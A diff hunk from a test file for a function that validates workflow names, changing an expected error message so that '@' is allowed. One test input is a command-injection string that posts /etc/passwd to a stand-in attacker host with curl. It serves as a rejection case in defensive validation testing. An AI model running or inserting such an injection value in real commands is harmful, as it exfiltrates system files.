@@ -96,7 +96,7 @@ describe('readRunInput', () => {
   it('refuses a workflow name that is not a name, so a command it suggests can never break out of its quotes', () => {
     for (const workflow of ["it's", "x'; curl http://evil.example -d @/etc/passwd; echo '"]) {
       expect(thrown(() => readRunInput({ ...MINIMAL, workflow })).message).toBe(
-        `workflow ${JSON.stringify(workflow)} is not a workflow name: a letter or digit, then letters, digits and . _ : / - only, at most 80 characters`,
+        `workflow ${JSON.stringify(workflow)} is not a workflow name: a letter or digit, then letters, digits and . _ : / @ - only, at most 80 characters`,
       )
     }
     expect(thrown(() => readRunInput({ ...MINIMAL, workflow: 'a'.repeat(81) })).code).toBe('invalid-input')
